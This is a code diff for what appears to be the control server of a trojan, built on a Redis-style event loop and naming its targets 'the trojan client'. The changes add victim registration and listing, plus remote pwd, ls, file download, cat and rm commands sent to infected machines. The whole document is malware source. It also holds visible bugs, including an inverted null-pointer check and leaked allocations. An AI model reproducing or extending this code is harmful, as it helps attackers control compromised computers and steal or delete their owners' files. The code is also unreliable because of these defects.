@@ -8,6 +8,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <malloc.h>
 
 
 #define generateCommandTimes(type, value) \
@@ -42,7 +43,7 @@ client* genericGetClient(client* c){
 	listRewind(server.clients, &li);
 	while((ln = listNext(&li))){
 		cl = listNodeValue(ln);
-		if(!cl->hashid){
+		if(!cl || !cl->hashid){
 			cl = NULL;
 			continue;
 		}
@@ -55,7 +56,20 @@ client* genericGetClient(client* c){
 }
 
 void enableCommand(client *c){
+	listNode *ln;
+	listIter li;
 	if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "1", 1)){
+		listRewind(server.clients, &li);
+		while((ln = listNext(&li))){
+			client *cl = listNodeValue(ln);
+			if(cl || !cl->hashid)
+				continue;
+			if(!strcasecmp(c->argv[2]->ptr, cl->hashid)){
+				addReply(c, shared.err);
+				c->flags |= CLIENT_CLOSE_AFTER_REPLY;
+				return;
+			}
+		}
 		c->hashid = sdsnew(c->argv[2]->ptr);
 		c->enable_client = true;
 		c->is_control = false;
@@ -74,39 +88,40 @@ void enableCommand(client *c){
 void getClientsCommand(client *c){
 	listNode* ln;
 	listIter li;
-	char buf[1024];
-	sds replySds = sdsempty();
+	char* buf[1024];
+	int hasClient = 0;
+
+	memset(buf, 0, sizeof(buf));
 	listRewind(server.clients, &li);
-	bool hasClient = false;
+	if(!c->enable_client || !c->is_control){
+		addReply(c, shared.err);
+		return;
+	}
+
 	while((ln = listNext(&li))){
 		client* cl = listNodeValue(ln);
-		if(!cl->enable_client || cl->is_control || cl == c){
+		if(!cl || !cl->enable_client || cl->is_control || cl == c){
 			continue;
 		}
-		hasClient = true;
-		memset(buf, 0, sizeof(buf));
-		sprintf(buf, "[%d] client->ip ", cl->fd);
+		hasClient++;
+		buf[hasClient - 1] = (char*)malloc(sizeof(char) * 1024);
+		memset(buf[hasClient - 1], 0, 1024 * sizeof(char));
 
 		struct sockaddr_in sa;
 		socklen_t len = sizeof(sa);
 		if(!getpeername(cl->fd, (struct sockaddr*)&sa, &len)){
-			strcat(buf + strlen(buf), inet_ntoa(sa.sin_addr));
-			strcat(buf + strlen(buf), ": ");
-			sprintf(buf + strlen(buf), "%d\t", sa.sin_port);
-			replySds = sdscat(replySds, sdsnew(buf));
-			/*sdscat(replySds, sdsnew(inet_ntoa(sa.sin_addr)));
-			sdscat(replySds, sdsnew(": "));
-			sdscat(replySds, sdsfromlonglong((long long)ntohs(sa.sin_port)));
-			*/
+			sprintf(buf[hasClient - 1] + strlen(buf[hasClient - 1]), "%s;%d;%s;", inet_ntoa(sa.sin_addr), sa.sin_port, cl->hashid);
 		}
 	}
 	if(!hasClient){
-		addReply(c, shared.err);
+		addReply(c, shared.emptymultibulk);
 		return;
 	}
-	addReplySds(c, sdsnew("+"));
-	addReplySds(c, replySds);
-	addReplySds(c, sdsnew("\r\n"));
+	addReply(c, shared.mbulkhdr[hasClient]);
+	for(int i = 0; i < hasClient; i++)
+		addReplyBulkCString(c, buf[i]);
+
+	return;
 }
 
 void sendCmdCommand(client *c){	
@@ -150,14 +165,12 @@ void printchar(unsigned char c){
 		case 15:
 			printf("f");break;
 		}
-		
 }
 
 void printhex(unsigned char buf[], int size){
 	for(int i = 0; i < size; i++){
 		printchar(buf[i] >> 4);
 		printchar(buf[i] & 0x0f);
-
 	}
 	printf("\n");
 }
@@ -197,8 +210,8 @@ void downloadCommand(client *c){
 		return;
 	}
 
-	aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
-	aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
+	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
+	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
 	/* unregister epoll events*/
 
 	/* send cmd to the trojan client */
@@ -208,12 +221,12 @@ void downloadCommand(client *c){
 	ret = write(tfd, pac.data, strlen(pac.data));
 	int flags = fcntl(tfd, F_GETFL, 0);
 
+	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
 	fcntl(tfd, F_SETFL, 0);
 	if(ret < 0)
 		goto err;
 	if(setjmp(jmp_env))
 		goto err;
-	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
 	if(fork()==0){
 		while(1){
 			memset(&pac, 0, sizeof(pac));
@@ -230,10 +243,10 @@ void downloadCommand(client *c){
 				case 2:
 					ret = write(cfd, pac.data, sizeof(pac.data));
 					close(cfd);
-					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
-					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
-					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+//					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+//					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+//					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+//					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
 					fcntl(tfd, F_SETFL, flags);
 					exit(0);
 				default:
@@ -242,10 +255,10 @@ void downloadCommand(client *c){
 			}
 			else{
 err:			/* error handle*/
-				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
-				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
-				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+//				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+//				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+//				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+//				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
 				pac.type = 0;
 				ret = write(cfd, &pac.data, sizeof(pac.data));
 				fcntl(tfd, F_SETFL, flags);
@@ -319,7 +332,7 @@ err:			/* error handle*/
 }
 
 void lsCommand(client *c){
-	int tfd, ret;
+	int ret;
 	char buff[1024 * 16];
 	client *cl = genericGetClient(c);
 
@@ -328,39 +341,77 @@ void lsCommand(client *c){
 		return;
 	}
 
-	tfd = cl->fd;
 	sprintf(buff, "*1\r\n$2\r\nls\r\n");
-	ret = write(tfd, buff, strlen(buff));
-	int flags = fcntl(tfd, F_GETFL, 0);
-
-	if(setjmp(jmp_env))
-		goto err;
+	ret = write(cl->fd, buff, strlen(buff));
+	int flags = fcntl(cl->fd, F_GETFL, 0);
 
 	if(fork() == 0){
-		fcntl(tfd, F_SETFL, 0);
+		if(setjmp(jmp_env))
+			goto err;
+		fcntl(cl->fd, F_SETFL, 0);
 		memset(buff, 0, sizeof(buff));
-		alarm(5);
-		int count = read(tfd, buff, sizeof(buff));
+		alarm(3);
+		int count = read(cl->fd, buff, sizeof(buff));
 		if(count > 0){
 			ret = write(c->fd, buff, strlen(buff));
 			if(ret < 0)
 				goto err;
+			exit(0);
 		}
 err:			/* error handle*/
 		addReply(c, shared.err);
-		fcntl(tfd, F_SETFL, flags);
+		fcntl(cl->fd, F_SETFL, flags);
 		exit(0);
 	}
 
 	return;
+}
 
+void pwdCommand(client *c){
+	int ret;
+	char buff[1024 * 16];
+	client *cl = genericGetClient(c);
+
+	if(cl == NULL){
+		addReply(c, shared.err);
+		return;
+	}
+
+	sprintf(buff, "*1\r\n$3\r\npwd\r\n");
+	ret = write(cl->fd, buff, strlen(buff));
+	int flags = fcntl(cl->fd, F_GETFL, 0);
+
+
+	if(fork() == 0){
+		if(setjmp(jmp_env))
+			goto err;
+		fcntl(cl->fd, F_SETFL, 0);
+		memset(buff, 0, sizeof(buff));
+		alarm(3);
+		int count = read(cl->fd, buff, sizeof(buff));
+		if(count > 0){
+			ret = write(c->fd, buff, strlen(buff));
+			if(ret < 0)
+				goto err;
+			exit(0);
+		}
+err:			/* error handle*/
+		addReply(c, shared.err);
+		fcntl(cl->fd, F_SETFL, flags);
+		exit(0);
+	}
+
+	return;
 }
 
 /*    generateComamnd using macro      */
+generateCommandTimes(new, 2)
+generateCommandTimes(cat, 3)
 generateCommandTimes(copy, 2)
 generateCommandTimes(cut, 2)
 generateCommandTimes(paste, 1)
-generateCommandTimes(delete, 2)
+generateCommandTimes(fpaste, 1)
+generateCommandTimes(rm, 2)
 
 
 /* directory control */
